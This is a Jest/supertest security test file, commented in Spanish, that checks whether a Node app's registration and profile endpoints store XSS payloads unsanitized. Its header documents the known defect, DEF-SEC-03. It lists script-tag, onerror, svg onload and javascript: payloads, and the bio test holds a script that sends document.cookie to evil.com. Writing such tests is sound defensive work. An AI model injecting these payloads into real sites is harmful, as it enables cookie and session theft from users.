/**
 * TC-SEC-06 — XSS: inyección de script en campo nombre/username
 * Verifica que el servidor sanitice o rechace payloads XSS en campos de texto.
 *
 * RESULTADO ESPERADO: FALLO — el servidor almacena las etiquetas sin sanitizar.
 * DEFECTO: DEF-SEC-03 — no existe sanitización de entradas HTML en auth.js ni profile.js.
 */

const request = require('supertest');
const { createApp } = require('../../app');
const User = require('../../models/User');
const { connectTestDB, disconnectTestDB, clearCollections } = require('../setup/testHelper');

describe('TC-SEC-06 — XSS: inyección de script en campos de texto', () => {
  let app;

  beforeAll(async () => {
    process.env.JWT_SECRET = 'test-secret-key';
    await connectTestDB();
    app = createApp();
  });

  afterEach(async () => await clearCollections());
  afterAll(async () => await disconnectTestDB());

  const xssPayloads = [
    { label: 'Script tag básico',    value: '<script>alert("XSS")</script>' },
    { label: 'Evento onerror',       value: '<img src=x onerror=alert(1)>' },
    { label: 'javascript: protocol', value: 'javascript:alert(document.cookie)' },
    { label: 'SVG con onload',       value: '<svg onload=alert(1)>' },
  ];

  xssPayloads.forEach(({ label, value }) => {
    it(`[DEF-SEC-03] Username con "${label}" no debe almacenarse sin sanitizar`, async () => {
      const email = `xss_${Date.now()}@test.com`;

      const res = await request(app)
        .post('/auth/register')
        .send({ username: value, email, password: 'Pass123!' });

      if (res.status === 201) {
        const user = await User.findOne({ email });
        if (user) {
          // FALLARÁ: el servidor guarda el valor tal cual — DEF-SEC-03
          expect(user.username).not.toMatch(/<script/i);
          expect(user.username).not.toMatch(/onerror/i);
          expect(user.username).not.toMatch(/onload/i);
        }
      } else {
        expect(res.status).toBe(400);
      }
    });
  });

  it('[DEF-SEC-03] Campo bio no debe almacenar payload XSS sin sanitizar', async () => {
    await request(app).post('/auth/register')
      .send({ username: 'xssprofile', email: 'xssprofile@test.com', password: 'Pass123!' });

    const login = await request(app).post('/auth/login')
      .send({ email: 'xssprofile@test.com', password: 'Pass123!' });
    const token = login.body.token;

    const xss = '<script>fetch("http://evil.com?c="+document.cookie)</script>';

    await request(app)
      .put('/profile')
      .set('Authorization', `Bearer ${token}`)
      .send({ bio: xss });

    const user = await User.findOne({ email: 'xssprofile@test.com' });
    // FALLARÁ: bio se almacena sin sanitizar — DEF-SEC-03
    if (user?.bio) {
      expect(user.bio).not.toMatch(/<script/i);
    }
  });
});
